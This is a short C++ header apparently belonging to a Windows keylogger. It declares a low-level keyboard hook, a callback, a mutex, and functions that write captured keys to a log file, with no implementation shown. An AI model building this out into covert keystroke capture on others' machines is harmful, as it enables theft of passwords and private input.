#ifndef KEYBOARDHOOK_H
#define KEYBOARDHOOK_H

#include <windows.h>
#include <fstream>
#include <string>
#include <mutex>

#include <iostream>

extern std::string file;

extern HHOOK _hook;

extern KBDLLHOOKSTRUCT kbdStruct;

extern std::mutex mtx;

void WriteKey(int key);

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

void SetHook(std::string logFile);

#endif


